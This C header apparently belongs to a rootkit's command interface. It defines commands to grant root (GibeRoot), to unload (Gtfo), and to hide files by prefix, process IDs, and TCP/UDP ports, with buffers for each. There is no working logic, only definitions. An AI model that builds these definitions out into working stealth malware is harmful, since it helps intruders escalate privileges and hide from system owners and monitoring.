#ifndef __CCC_H__
#define __CCC_H__

#define SZ_PIDS 128
#define SZ_PORTS 128
#define SZ_PREFIX 512

typedef struct
{
    enum {
        GibeRoot,
	Gtfo,
	SetFileHidingPrefix,
	SetHiddenPids,
	SetHiddenTCP,
	SetHiddenUDP,
    } cmd;
    union {
        // todo
	char file_hiding_prefix[SZ_PREFIX];
	int hidden_pids[SZ_PIDS];
	int hidden_ports[SZ_PORTS];
    } payload;
} CCC;

#endif
